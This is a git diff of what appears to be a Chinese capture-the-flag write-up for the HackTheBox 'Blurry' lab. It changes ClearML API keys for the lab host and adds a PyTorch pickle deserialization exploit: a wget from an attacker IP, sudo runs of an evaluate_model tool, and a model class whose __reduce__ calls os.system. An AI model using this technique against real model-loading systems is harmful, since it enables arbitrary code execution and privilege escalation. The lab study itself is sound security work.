@@ -73,8 +73,8 @@ api {
     api_server: http://api.blurry.htb
     files_server: http://files.blurry.htb
     credentials {
-        "access_key" = "8J3OL043GI2URS5NSVAA"
-        "secret_key"  = "52jyLt02VOAMRQkUN4UvIgWTaCqIJHMSP1XTVBL2snv5YzzAbS"
+        "access_key" = "AR4FO17G33P94TC9QZZ7"
+        "secret_key"  = "hwzVEXw76bdhsNgTadi7OgsJnTYyLcNYpLCkIFNpKr7oFSGal5"
     }
 }
 ```
@@ -295,4 +295,41 @@ if __name__ == "__main__":
 
 ```
 
+
+
+
 参考[Pickle/PyTorch反序列化漏洞](https://cloud.tencent.com/developer/article/2237040)
+
+
+wget http://10.10.16.7/exp.pth
+
+sudo /usr/bin/evaluate_model /models/*.pth
+
+sudo /usr/bin/evaluate_model /models/exp.pth
+
+
+```
+import torch
+import torch.nn as nn
+import torch.nn.functional as F
+import os
+
+class Net(nn.Module):
+    def __init__(self):
+        super(Net, self).__init__()
+        self.layer1 = nn.Linear(1, 128)
+        self.layer2 = nn.Linear(128, 128)
+        self.layer3 = nn.Linear(128, 2)
+
+    def forward(self, x):
+        x = F.relu(self.layer1(x))
+        x = F.relu(self.layer2(x))
+        action = self.layer3(x)
+        return action
+
+    def __reduce__(self):
+        return (os.system, ('ping 10.10.16.7 -c 4',))
+if __name__ == '__main__':
+    a = Net()
+    torch.save(a, '12.pth')		
+```
